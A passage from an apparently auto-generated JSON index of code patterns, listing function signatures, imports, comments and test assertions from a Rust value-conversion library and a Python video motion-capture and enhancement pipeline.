          "fn visit_u64(&mut self, value: u64) -> Result<(), Error> {",
          "fn visit_i64(&mut self, value: i64) -> Result<(), Error> {",
          "fn visit_u128(&mut self, value: u128) -> Result<(), Error> {",
          "fn visit_i128(&mut self, value: i128) -> Result<(), Error> {",
          "fn visit_f64(&mut self, value: f64) -> Result<(), Error> {",
          "fn visit_bool(&mut self, value: bool) -> Result<(), Error> {",
          "fn visit_str(&mut self, value: &str) -> Result<(), Error> {",
          "fn visit_borrowed_str(&mut self, value: &'v str) -> Result<(), Error> {",
          "fn visit_char(&mut self, value: char) -> Result<(), Error> {",
          "fn visit_error(&mut self, err: &(dyn std::error::Error + 'static)) -> Result<(), Error> {",
          "fn visit_borrowed_error(",
          "fn visit_any(&mut self, value: Value) -> Result<(), Error> {",
          "fn visit_null(&mut self) -> Result<(), Error> {",
          "fn visit_u64(&mut self, value: u64) -> Result<(), Error> {",
          "fn visit_i64(&mut self, value: i64) -> Result<(), Error> {",
          "fn visit_u128(&mut self, value: u128) -> Result<(), Error> {",
          "fn visit_i128(&mut self, value: i128) -> Result<(), Error> {",
          "fn visit_f64(&mut self, value: f64) -> Result<(), Error> {",
          "fn visit_bool(&mut self, value: bool) -> Result<(), Error> {",
          "fn visit_str(&mut self, value: &str) -> Result<(), Error> {",
          "fn visit_borrowed_str(&mut self, value: &'v str) -> Result<(), Error> {",
          "fn visit_char(&mut self, value: char) -> Result<(), Error> {",
          "fn visit_error(&mut self, err: &(dyn std::error::Error + 'static)) -> Result<(), Error> {",
          "fn visit_borrowed_error(",
          "fn visit_any(&mut self, value: value_bag::ValueBag) -> Result<(), Error> {",
          "fn visit_empty(&mut self) -> Result<(), Error> {",
          "fn visit_u64(&mut self, value: u64) -> Result<(), Error> {",
          "fn visit_i64(&mut self, value: i64) -> Result<(), Error> {",
          "fn visit_u128(&mut self, value: u128) -> Result<(), Error> {",
          "fn visit_i128(&mut self, value: i128) -> Result<(), Error> {",
          "fn visit_f64(&mut self, value: f64) -> Result<(), Error> {",
          "fn visit_bool(&mut self, value: bool) -> Result<(), Error> {",
          "fn visit_str(&mut self, value: &str) -> Result<(), Error> {",
          "fn visit_borrowed_str(&mut self, value: &'v str) -> Result<(), Error> {",
          "fn visit_char(&mut self, value: char) -> Result<(), Error> {",
          "fn visit_error(",
          "fn visit_borrowed_error(",
          "fn from(_: ()) -> Self {",
          "fn from(v: bool) -> Self {",
          "fn from(v: char) -> Self {",
          "fn from(v: f32) -> Self {",
          "fn from(v: f64) -> Self {",
          "fn from(v: i8) -> Self {",
          "fn from(v: i16) -> Self {",
          "fn from(v: i32) -> Self {",
          "fn from(v: i64) -> Self {",
          "fn from(v: isize) -> Self {",
          "fn from(v: u8) -> Self {",
          "fn from(v: u16) -> Self {",
          "fn from(v: u32) -> Self {",
          "fn from(v: u64) -> Self {",
          "fn from(v: usize) -> Self {",
          "fn from(v: i128) -> Self {",
          "fn from(v: u128) -> Self {",
          "fn from(v: &'v str) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn unsigned() -> impl Iterator<Item = Value<'static>> {",
          "fn signed() -> impl Iterator<Item = Value<'static>> {",
          "fn float() -> impl Iterator<Item = Value<'static>> {",
          "fn bool() -> impl Iterator<Item = Value<'static>> {",
          "fn str() -> impl Iterator<Item = Value<'static>> {",
          "fn char() -> impl Iterator<Item = Value<'static>> {",
          "fn test_to_value_display() {",
          "fn test_to_value_structured() {",
          "fn test_to_number() {",
          "fn test_to_float() {",
          "fn test_to_cow_str() {",
          "fn test_to_bool() {",
          "fn test_to_char() {",
          "fn test_visit_integer() {",
          "fn visit_any(&mut self, value: Value) -> Result<(), Error> {",
          "fn visit_u64(&mut self, value: u64) -> Result<(), Error> {",
          "fn test_visit_borrowed_str() {",
          "fn visit_any(&mut self, value: Value) -> Result<(), Error> {",
          "fn visit_borrowed_str(&mut self, value: &'v str) -> Result<(), Error> {"
        ],
        "struct_defs": [
          "struct InnerVisitValue<V>(V);",
          "struct Extract(Option<u64>);",
          "struct Extract<'v>(Option<&'v str>);"
        ],
        "impl_blocks": [
          "impl ToValue for str {",
          "impl ToValue for () {",
          "impl ToValue for $into_ty {",
          "impl ToValue for std::num::$into_ty {",
          "impl ToValue for String {"
        ],
        "uses": [
          "use std::fmt;",
          "use std::borrow::Cow;",
          "use std::rc::Rc;",
          "use std::sync::Arc;",
          "use super::*;",
          "use super::*;",
          "use super::*;",
          "use super::*;"
        ],
        "macros": [
          "/// assert_eq!(None, value.to_i64());",
          "/// assert_eq!(Some(42), value.to_i64());",
          "/// assert_eq!(Some(42), value.to_i64());",
          "Inner::I128(_) => unimplemented!(),",
          "Inner::U128(_) => unimplemented!(),",
          "Inner::Debug(_) => unimplemented!(),",
          "Inner::Display(_) => unimplemented!(),",
          "assert_eq!(42u64.to_value().to_string(), \"42\");",
          "assert_eq!(42i64.to_value().to_string(), \"42\");",
          "assert_eq!(42.01f64.to_value().to_string(), \"42.01\");",
          "assert_eq!(true.to_value().to_string(), \"true\");",
          "assert_eq!('a'.to_value().to_string(), \"a\");",
          "assert_eq!(\"a loong string\".to_value().to_string(), \"a loong string\");",
          "assert_eq!(Some(true).to_value().to_string(), \"true\");",
          "assert_eq!(().to_value().to_string(), \"None\");",
          "assert_eq!(None::<bool>.to_value().to_string(), \"None\");",
          "assert_eq!(42u64.to_value().to_token(), inner::Token::U64(42));",
          "assert_eq!(42i64.to_value().to_token(), inner::Token::I64(42));",
          "assert_eq!(42.01f64.to_value().to_token(), inner::Token::F64(42.01));",
          "assert_eq!(true.to_value().to_token(), inner::Token::Bool(true));",
          "assert_eq!('a'.to_value().to_token(), inner::Token::Char('a'));",
          "assert_eq!(",
          "assert_eq!(Some(true).to_value().to_token(), inner::Token::Bool(true));",
          "assert_eq!(().to_value().to_token(), inner::Token::None);",
          "assert_eq!(None::<bool>.to_value().to_token(), inner::Token::None);",
          "assert!(v.to_u64().is_some());",
          "assert!(v.to_i64().is_some());",
          "assert!(v.to_i64().is_some());",
          "assert!(v.to_f64().is_some());",
          "assert!(v.to_u64().is_none());",
          "assert!(v.to_i64().is_none());",
          "assert!(v.to_f64().is_none());",
          "assert!(Value::from(i32::MIN).to_f64().is_some());",
          "assert!(Value::from(u32::MAX).to_f64().is_some());",
          "assert!(Value::from((i32::MIN as i64) - 1).to_f64().is_none());",
          "assert!(Value::from((u32::MAX as u64) + 1).to_f64().is_none());",
          "assert!(v.to_borrowed_str().is_some());",
          "assert!(v.to_cow_str().is_some());",
          "assert!(v.to_borrowed_str().is_some());",
          "assert!(v.to_cow_str().is_some());",
          "assert!(v.to_borrowed_str().is_none());",
          "assert!(v.to_cow_str().is_none());",
          "assert!(v.to_bool().is_some());",
          "assert!(v.to_bool().is_none());",
          "assert!(v.to_char().is_some());",
          "assert!(v.to_char().is_none());",
          "unimplemented!(\"unexpected value: {value:?}\")",
          "assert_eq!(Some(42), extract.0);",
          "unimplemented!(\"unexpected value: {value:?}\")",
          "assert_eq!(Some(\"A short-lived string\"), extract.0);"
        ],
        "derives": [
          "#[derive(Clone)]",
          "#[derive(Clone)]",
          "#[derive(Debug, PartialEq)]"
        ],
        "error_handling": 39
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/motion-pipeline",
    "name": "motion-pipeline",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/run.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "from pathlib import Path",
          "from src.pipeline import main"
        ],
        "comments": [
          "# Add src to path"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/enhance.py",
        "docstrings": [],
        "function_defs": [
          "def main():",
          "def progress(gen, score):",
          "def enhance_with_config(img, evo_config):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import argparse",
          "from pathlib import Path",
          "from enhance_engine import (",
          "from scene_detection import SceneDetector, analyze_video",
          "from evolutionary_optimizer import EvolutionaryOptimizer, EvolutionaryConfig",
          "from training import EvolutionaryTrainer, TrainingConfig, extract_training_pairs",
          "import cv2",
          "from scene_detection import SceneDetector, SceneType",
          "import traceback"
        ],
        "comments": [
          "# Add src to path",
          "# Profile selection",
          "# Individual settings",
          "# Feature toggles",
          "# Advanced modes",
          "# Output options",
          "# Validate input",
          "# Determine output path",
          "# Analysis mode",
          "# Training mode",
          "# Extract training pairs",
          "# Configure training",
          "# Train",
          "# Create enhancer",
          "# Get video info",
          "# Build configuration",
          "# Apply overrides",
          "# Evolutionary optimization mode",
          "# Get sample frames",
          "# Detect scene type from first sample",
          "# Use default scene type for now",
          "# Apply optimized settings",
          "# Scene-adaptive mode",
          "# TODO: Process each scene with its recommended settings",
          "# For now, use the first scene's recommendations",
          "# Run enhancement"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 1,
        "error_handling": 3,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/tests/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/tests/human_generator.py",
        "docstrings": [],
        "function_defs": [
          "def get_pixel_coords(self, name: str, frame_width: int, frame_height: int) -> Tuple[int, int]:\n\"\"\"Get pixel coordinates for a keypoint.\"\"\"\nif name not in self.keypoints:\nreturn (0, 0)\nx, y = self.keypoints[name]\nreturn (int(x * frame_width), int(y * frame_height))\n\n\nclass AnatomicalHumanGenerator:\n\"\"\"",
          "def __init__(self, height_ratio: float = 0.8):\n\"\"\"\nArgs:\nheight_ratio: Human height relative to frame height (0.8 = 80% of frame)\n\"\"\"",
          "def generate_standing_pose(",
          "def y_pos(prop_name: str) -> float:",
          "def generate_walking_pose(",
          "def y_pos(prop_name: str) -> float:",
          "def generate_exercise_pose(",
          "def __init__(self, width: int = 640, height: int = 480):",
          "def render_skeleton(",
          "def render_anatomical(",
          "def px(name: str) -> Tuple[int, int]:",
          "def create_human_video("
        ],
        "class_defs": [
          "class HumanPose:",
          "class AnatomicalHumanGenerator:",
          "class HumanRenderer:"
        ],
        "imports": [
          "import numpy as np",
          "import cv2",
          "from typing import Dict, List, Tuple, Optional",
          "from dataclasses import dataclass",
          "from pathlib import Path",
          "import sys"
        ],
        "comments": [
          "# Anthropometric proportions (based on 8-head canon and medical references)",
          "# All measurements relative to total height = 1.0",
          "# Vertical positions (from top of head = 0)",
          "# Horizontal widths (relative to height)",
          "# Limb lengths (relative to height)",
          "# Joint offsets",
          "# MediaPipe-compatible keypoint names (33 points)",
          "# Vertical positions (normalized to frame, adjusted for center)",
          "# Shoulder and hip widths",
          "# Leg spread adjustment",
          "# Head keypoints",
          "# Shoulders",
          "# Arms with angle",
          "# Left arm",
          "# Right arm",
          "# Hips",
          "# Legs",
          "# Feet",
          "# Walking cycle: legs and arms swing in opposition",
          "# Head (slight bob during walk)",
          "# Shoulders (slight rotation during walk)",
          "# Arms swinging",
          "# Left arm swings forward when right leg forward",
          "# Elbow bends more when arm swings back",
          "# Right arm",
          "# Hips (slight rotation)",
          "# Legs",
          "# Left leg",
          "# Knee bends when leg swings back",
          "# Foot position",
          "# Right leg (opposite phase)",
          "# Arms go from down to up, legs spread",
          "# Squat down and up",
          "# Adjust knees for squat (override)",
          "# Raise arms overhead",
          "# Skeleton connections for drawing",
          "# Face",
          "# Torso",
          "# Left arm",
          "# Right arm",
          "# Left leg",
          "# Right leg",
          "# Body part colors (BGR)",
          "# Draw body parts as filled polygons for more realistic appearance",
          "# Head (ellipse)",
          "# Eyes",
          "# Torso (polygon)",
          "# Arms (thick lines or polygons)",
          "# Hand",
          "# Legs",
          "# Foot",
          "# Create background",
          "# Add simple environment",
          "# Floor line",
          "# Generate pose based on motion type",
          "# Walking across screen",
          "# Subtle breathing motion",
          "# Render human",
          "# Walking",
          "# Exercise",
          "# Standing"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/tests/test_pipeline.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, output_dir: str):",
          "def create_moving_shapes(",
          "def create_anatomical_human(",
          "def create_stick_figure(",
          "def create_shaky_video(",
          "def create_video_with_audio(",
          "def create_occlusion_video(",
          "def __init__(self):",
          "def ok(self, name: str, message: str = \"\"):",
          "def fail(self, name: str, error: str):",
          "def summary(self):",
          "def generator(tmp_path_factory):\n\"\"\"Create a shared video generator for tests.\"\"\"\ntmp_dir = tmp_path_factory.mktemp(\"test_videos\")\nreturn VideoGenerator(str(tmp_dir))\n\n@pytest.fixture\ndef results():\n\"\"\"Create a result tracker for tests.\"\"\"",
          "def results():\n\"\"\"Create a result tracker for tests.\"\"\"\nreturn ResultTracker()\n\n\n# Alias class for backward compatibility\nclass VideoGenerator(TestVideoGenerator):\npass\n\n",
          "def test_video_utils(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test video utilities.\"\"\"\nprint(\"\\n[Testing video_utils]\")\n\nvideo_path = generator.create_moving_shapes(\"test_utils.mp4\")\n\n# Test metadata extraction\ntry:\nmeta = video_utils.get_video_metadata(video_path)\nif meta and meta.get('duration_ms', 0) > 0:",
          "def test_pose_estimation(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test pose estimation.\"\"\"\nprint(\"\\n[Testing pose_estimation]\")\n\nvideo_path = generator.create_stick_figure(\"test_pose.mp4\")\n\ntry:\nresult = pose_estimation.process_video_poses(\nvideo_path,\ntarget_fps=5.0,",
          "def test_optical_flow(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test optical flow.\"\"\"\nprint(\"\\n[Testing optical_flow]\")\n\nvideo_path = generator.create_moving_shapes(\"test_flow.mp4\")\n\nwith tempfile.TemporaryDirectory() as tmpdir:\ntry:\nresult = optical_flow.process_video_flow(\nvideo_path,",
          "def test_tracking(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test person tracking.\"\"\"\nprint(\"\\n[Testing tracking]\")\n\nvideo_path = generator.create_stick_figure(\"test_tracking.mp4\")\n\ntry:\nresult = tracking.process_video_with_tracking(\nvideo_path,\ntarget_fps=5.0,",
          "def test_camera_motion(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test camera motion estimation.\"\"\"\nprint(\"\\n[Testing camera_motion]\")\n\nvideo_path = generator.create_shaky_video(\"test_camera.mp4\", shake_intensity=10)\n\ntry:\nresult = camera_motion.process_video_camera_motion(\nvideo_path,\ntarget_fps=10.0",
          "def test_pose_3d(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test 3D pose lifting.\"\"\"\nprint(\"\\n[Testing pose_3d]\")\n\nvideo_path = generator.create_stick_figure(\"test_3d.mp4\")\n\ntry:\nresult = pose_3d.process_video_3d_poses(\nvideo_path,\ntarget_fps=5.0,",
          "def test_stabilization(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test video stabilization.\"\"\"\nprint(\"\\n[Testing stabilization]\")\n\nvideo_path = generator.create_shaky_video(\"test_stab.mp4\", shake_intensity=15)\n\n# Test analysis\ntry:\nanalysis = stabilization.analyze_shakiness(video_path, sample_fps=10.0)\nresults.ok(\"analyze_shakiness\",",
          "def test_inpainting(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test video inpainting.\"\"\"\nprint(\"\\n[Testing inpainting]\")\n\nvideo_path = generator.create_occlusion_video(\"test_inpaint.mp4\")\n\nwith tempfile.TemporaryDirectory() as tmpdir:\ntry:\noutput_path = Path(tmpdir) / \"inpainted.mp4\"\n",
          "def test_bvh_export(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test BVH export.\"\"\"\nprint(\"\\n[Testing bvh_export]\")\n\nvideo_path = generator.create_stick_figure(\"test_bvh.mp4\")\n\nwith tempfile.TemporaryDirectory() as tmpdir:\ntry:\n# First get 3D poses\npose_result = pose_3d.process_video_3d_poses(",
          "def test_audio_transcribe(results: ResultTracker):\n\"\"\"Test audio transcription (if available).\"\"\"\nprint(\"\\n[Testing audio_transcribe]\")\n\nif audio_transcribe.check_whisper_cpp():\nresults.ok(\"check_whisper_cpp\", \"whisper-cli available\")\nelse:\nresults.fail(\"check_whisper_cpp\", \"whisper-cli not found\")\nreturn\n",
          "def test_dataset_export(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test dataset export.\"\"\"\nprint(\"\\n[Testing dataset_export]\")\n\nwith tempfile.TemporaryDirectory() as tmpdir:\n# Create test data structure\ndata_dir = Path(tmpdir)\noutput_dir = data_dir / \"output\" / \"test_video\"\noutput_dir.mkdir(parents=True)\n",
          "def test_full_pipeline(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test full pipeline integration.\"\"\"\nprint(\"\\n[Testing full pipeline]\")\n\nwith tempfile.TemporaryDirectory() as tmpdir:\ndata_dir = Path(tmpdir)\n\n# Set up directories\ninput_dir = data_dir / \"input\"\ninput_dir.mkdir(parents=True)",
          "def test_database(generator: VideoGenerator, results: ResultTracker):\n\"\"\"Test database operations.\"\"\"\nprint(\"\\n[Testing database]\")\n\nwith tempfile.TemporaryDirectory() as tmpdir:\ndb_path = Path(tmpdir) / \"test.db\"\nos.environ['MOTION_DB_PATH'] = str(db_path)\n\n# Create a real test video file\ntest_video = generator.create_moving_shapes(\"db_test.mp4\", duration=1.0)",
          "def main():\n\"\"\"Run all tests.\"\"\"\nprint(\"=\"*60)\nprint(\"MOTION PIPELINE - EXHAUSTIVE TEST SUITE\")\nprint(\"=\"*60)\n\nresults = ResultTracker()\n\nwith tempfile.TemporaryDirectory() as tmpdir:\ngenerator = TestVideoGenerator(tmpdir)"
        ],
        "class_defs": [
          "class TestVideoGenerator:",
          "class ResultTracker:",
          "class VideoGenerator(TestVideoGenerator):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import json",
          "import tempfile",
          "import shutil",
          "from pathlib import Path",
          "import numpy as np",
          "import cv2",
          "from human_generator import AnatomicalHumanGenerator, HumanRenderer, create_human_video",
          "from src import database as db",
          "from src import video_utils",
          "from src import pose_estimation",
          "from src import optical_flow",
          "from src import audio_transcribe",
          "from src import tracking",
          "from src import camera_motion",
          "from src import pose_3d",
          "from src import bvh_export",
          "from src import stabilization",
          "from src import inpainting",
          "from src import dataset_export",
          "from src import pipeline",
          "import subprocess",
          "import wave",
          "import pytest",
          "import importlib"
        ],
        "comments": [
          "# Add src and tests to path",
          "# Moving circle",
          "# Moving rectangle",
          "# Rotating line",
          "# Use anatomical human instead of simple stick figure",
          "# Create a larger canvas and crop with shake offsets",
          "# Create canvas with pattern",
          "# Draw grid pattern",
          "# Draw some objects",
          "# Apply shake",
          "# Crop with offset",
          "# First create video",
          "# Create audio file (sine wave)",
          "# Write WAV file",
          "# Combine with ffmpeg",
          "# If ffmpeg fails, just use video without audio",
          "# Cleanup",
          "# Background object (gets occluded)",
          "# Foreground occluder moving across",
          "# Pytest fixtures",
          "# Alias class for backward compatibility",
          "# Test metadata extraction",
          "# Test VideoReader",
          "# Test analysis",
          "# Test stabilization",
          "# Test with manual mask region",
          "# First get 3D poses",
          "# Export to BVH",
          "# Check model exists",
          "# Create test data structure",
          "# Create sample poses.json",
          "# Test COCO export",
          "# Test JSON export",
          "# Test stats",
          "# Set up directories",
          "# Create test video in input",
          "# Initialize pipeline",
          "# Ingest",
          "# Process (subset of stages for speed)",
          "# Stats",
          "# Create a real test video file",
          "# Re-init with test path",
          "# Add video",
          "# Get video",
          "# Create job",
          "# Complete job",
          "# Run all tests"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 34,
        "decorators": [
          "@pytest.fixture(scope=\"module\")",
          "@pytest.fixture"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/audio_transcribe.py",
        "docstrings": [],
        "function_defs": [
          "def check_whisper_cpp() -> bool:\n\"\"\"Check if whisper.cpp is installed.\"\"\"\ntry:\n# Check for whisper-cli (homebrew) or whisper-cpp\nfor cmd in ['whisper-cli', 'whisper-cpp']:\nresult = subprocess.run(\n['which', cmd],\ncapture_output=True,\ntext=True\n)",
          "def check_argos_translate() -> bool:\n\"\"\"Check if Argos Translate is available.\"\"\"\ntry:\nimport argostranslate.package\nimport argostranslate.translate\nreturn True\nexcept ImportError:\nreturn False\n\n",
          "def transcribe_with_whisper_cpp(",
          "def transcribe_with_whisper_python(",
          "def translate_text(",
          "def process_video_audio("
        ],
        "class_defs": [],
        "imports": [
          "import subprocess",
          "import json",
          "import tempfile",
          "from pathlib import Path",
          "from typing import Dict, List, Optional",
          "import os",
          "import argostranslate.package",
          "import argostranslate.translate",
          "import whisper",
          "import argostranslate.package",
          "import argostranslate.translate",
          "from deep_translator import GoogleTranslator",
          "from .video_utils import extract_audio",
          "import sys"
        ],
        "comments": [
          "# Check for whisper-cli (homebrew) or whisper-cpp",
          "# Find whisper.cpp binary (whisper-cli on homebrew)",
          "# Find model file",
          "# Create temp file for JSON output",
          "# Build command",
          "# Read JSON output file",
          "# Clean up temp file",
          "# Supported languages",
          "# Try Argos Translate first",
          "# Get installed languages",
          "# Try to download the package",
          "# Retry",
          "# Try deep-translator (simpler, fewer dependencies)",
          "# Fallback: Return original with note (user can use external translation)",
          "# Extract audio",
          "# Transcribe",
          "# Try whisper.cpp first, fall back to Python",
          "# Translate if needed",
          "# Progress",
          "# Save results"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 18,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/video_enhance.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, models_dir: str = '/app/models'):",
          "def enhance_video(self, input_path: str, output_path: str,",
          "def _get_profile_params(self, profile: str) -> dict:\n\"\"\"Get enhancement parameters for a profile.\"\"\"\nprofiles = {\n'quality': {\n'upscale': True,\n'upscale_model': 'realesrgan',\n'denoise': True,\n'denoise_strength': 0.5,\n'face_enhance': True,\n'stabilize': True,",
          "def _get_video_info(self, video_path: str) -> dict:\n\"\"\"Get video metadata.\"\"\"\ncmd = [\n'ffprobe', '-v', 'quiet',\n'-print_format', 'json',\n'-show_format', '-show_streams',\nvideo_path\n]\nresult = subprocess.run(cmd, capture_output=True, text=True)\ndata = json.loads(result.stdout)",
          "def _extract_frames(self, video_path: str, output_dir: str):\n\"\"\"Extract all frames from video.\"\"\"\ncmd = [\n'ffmpeg', '-i', video_path,\n'-qscale:v', '2',  # High quality JPEG\nf'{output_dir}/frame_%06d.jpg',\n'-y'\n]\nsubprocess.run(cmd, capture_output=True)\n",
          "def _stabilize_video(self, input_path: str, output_path: str):\n\"\"\"Stabilize video using VidStab (2-pass).\"\"\"\n# Pass 1: Analyze\ncmd1 = [\n'ffmpeg', '-i', input_path,\n'-vf', 'vidstabdetect=shakiness=5:accuracy=15',\n'-f', 'null', '-'\n]\nsubprocess.run(cmd1, capture_output=True)\n",
          "def _denoise_frames(self, input_dir: Path, output_dir: Path, strength: float):\n\"\"\"Denoise frames using bilateral filter + temporal averaging.\"\"\"\nframes = sorted(input_dir.glob('*.jpg'))\n\nfor i, frame_path in enumerate(tqdm(frames, desc=\"Denoising\")):\nimg = cv2.imread(str(frame_path))\n\n# Bilateral filter (edge-preserving denoising)\nd = int(9 * strength) or 5\nsigma_color = int(75 * strength) or 30",
          "def _upscale_frames(self, input_dir: Path, output_dir: Path, model: str):\n\"\"\"Upscale frames using Real-ESRGAN.\"\"\"\ntry:\nfrom realesrgan import RealESRGANer\nfrom basicsr.archs.rrdbnet_arch import RRDBNet\n\n# Load model\nmodel_path = str(self.realesrgan_model)\n\n# Setup model architecture",
          "def _upscale_frames_opencv(self, input_dir: Path, output_dir: Path):\n\"\"\"Fallback upscaling using OpenCV DNN.\"\"\"\n# Use EDSR model\nsr = cv2.dnn_superres.DnnSuperResImpl.create()\nmodel_path = str(self.models_dir / 'upscale' / 'EDSR_x4.pb')\n\nif Path(model_path).exists():\nsr.readModel(model_path)\nsr.setModel('edsr', 4)\nelse:",
          "def _enhance_faces(self, input_dir: Path, output_dir: Path):\n\"\"\"Enhance faces using GFPGAN.\"\"\"\ntry:\nfrom gfpgan import GFPGANer\n\nface_enhancer = GFPGANer(\nmodel_path=str(self.gfpgan_model),\nupscale=1,  # Don't upscale, just enhance\narch='clean',\nchannel_multiplier=2,",
          "def _interpolate_frames(self, input_dir: Path, output_dir: Path,",
          "def _interpolate_frame_pair(self, frame1: np.ndarray, frame2: np.ndarray,",
          "def _reconstruct_video(self, frames_dir: str, original_video: str,",
          "def enhance_single_frame(frame_path: str, output_path: str,"
        ],
        "class_defs": [
          "class TopazEquivalentEnhancer:"
        ],
        "imports": [
          "import os",
          "import subprocess",
          "import tempfile",
          "from pathlib import Path",
          "import json",
          "import cv2",
          "import numpy as np",
          "from tqdm import tqdm",
          "from realesrgan import RealESRGANer",
          "from basicsr.archs.rrdbnet_arch import RRDBNet",
          "from gfpgan import GFPGANer",
          "import shutil",
          "from realesrgan import RealESRGANer",
          "from basicsr.archs.rrdbnet_arch import RRDBNet",
          "from gfpgan import GFPGANer",
          "import sys"
        ],
        "comments": [
          "# Model paths",
          "# Enhancement settings",
          "# Get video info",
          "# Set profile parameters",
          "# Step 1: Extract frames",
          "# Step 2: Stabilization (if enabled)",
          "# Re-extract frames from stabilized",
          "# Step 3: Denoise frames",
          "# Step 4: Upscale frames",
          "# Step 5: Face enhancement",
          "# Step 6: Frame interpolation (if target FPS specified)",
          "# Reconstruct video",
          "# Pass 1: Analyze",
          "# Pass 2: Transform",
          "# Bilateral filter (edge-preserving denoising)",
          "# Non-local means (better but slower)",
          "# denoised = cv2.fastNlMeansDenoisingColored(img, None, 10, 10, 7, 21)",
          "# Load model",
          "# Setup model architecture",
          "# Use EDSR model",
          "# Enhance",
          "# Save original frame",
          "# Interpolate frames between",
          "# Save last frame",
          "# Convert to grayscale for flow computation",
          "# Compute forward flow (frame1 -> frame2)",
          "# Warp frame1 towards frame2",
          "# Compute intermediate position",
          "# Warp and blend",
          "# Create video from frames",
          "# Add original audio",
          "# Cleanup"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 8,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/bvh_export.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def write(",
          "def _write_skeleton(self, f):\n\"\"\"Write BVH skeleton hierarchy.\"\"\"\n# Build parent-child relationships\nchildren = {name: [] for name, _, _, _, _ in BVH_SKELETON}\nfor name, parent, _, _, _ in BVH_SKELETON:\nif parent:\nchildren[parent].append(name)\n\n# Find root\nroot = None",
          "def _write_joint(self, f, name, skeleton, children, indent):\n\"\"\"Write a joint and its children.\"\"\"\n# Find joint info\noffset = (0, 0, 0)\nfor jname, parent, ox, oy, oz in skeleton:\nif jname == name:\noffset = (ox, oy, oz)\nbreak\n\nindent_str = '\\t' * indent",
          "def _pose_to_frame_data(self, pose: Dict, include_position: bool) -> List[float]:\n\"\"\"\nConvert 3D pose to BVH frame data.\n\nArgs:\npose: 3D pose dictionary\ninclude_position: Include root position\n\nReturns:\nList of float values for BVH frame",
          "def _calculate_rotations(self, joints: Dict) -> Dict[str, List[float]]:\n\"\"\"\nCalculate joint rotations from positions.\n\nArgs:\njoints: Dictionary of joint positions\n\nReturns:\nDictionary of joint rotations (Euler angles in degrees)\n\"\"\"",
          "def _get_default_frame(self) -> List[float]:\n\"\"\"Get default T-pose frame data.\"\"\"\n# 6 channels for root + 3 channels per joint\nnum_joints = len(BVH_SKELETON)\nreturn [0.0] * (6 + (num_joints - 1) * 3)\n\n\ndef export_to_bvh(\nposes_3d_data: Dict,\noutput_path: str,",
          "def export_to_bvh(",
          "def export_tracked_to_bvh("
        ],
        "class_defs": [
          "class BVHWriter:"
        ],
        "imports": [
          "import numpy as np",
          "from typing import List, Dict, Optional, Tuple",
          "from pathlib import Path",
          "import json",
          "from .pose_3d import Pose3DLifter, pose_3d_to_dict",
          "import sys"
        ],
        "comments": [
          "# BVH skeleton definition matching MediaPipe landmarks",
          "# Each joint: (name, parent_name, offset_x, offset_y, offset_z)",
          "# Mapping from MediaPipe joint names to BVH joint names",
          "# Write HIERARCHY section",
          "# Write MOTION section",
          "# Write frame data",
          "# Write default pose",
          "# Build parent-child relationships",
          "# Find root",
          "# Write hierarchy recursively",
          "# Find joint info",
          "# Write children",
          "# End site for leaf nodes",
          "# Calculate rotations from joint positions",
          "# Root position (Hips)",
          "# Calculate hip center from left_hip and right_hip",
          "# Add rotations for each joint",
          "# For each BVH joint, calculate rotation",
          "# Calculate arm rotations",
          "# Calculate upper arm direction",
          "# Calculate rotation angles",
          "# Simplified: just use direction for basic animation",
          "# Calculate leg rotations similarly",
          "# 6 channels for root + 3 channels per joint",
          "# Extract 3D poses",
          "# Process each track",
          "# Write BVH file"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/motion-pipeline/src/video_utils.py",
        "docstrings": [],
        "function_defs": [
          "def get_video_metadata(video_path: str) -> Dict:\n\"\"\"\nExtract video metadata using FFprobe.\nReturns dict with duration, dimensions, fps, etc.\n\"\"\"",
          "def extract_frames_generator(",
          "def extract_frames_to_disk(",
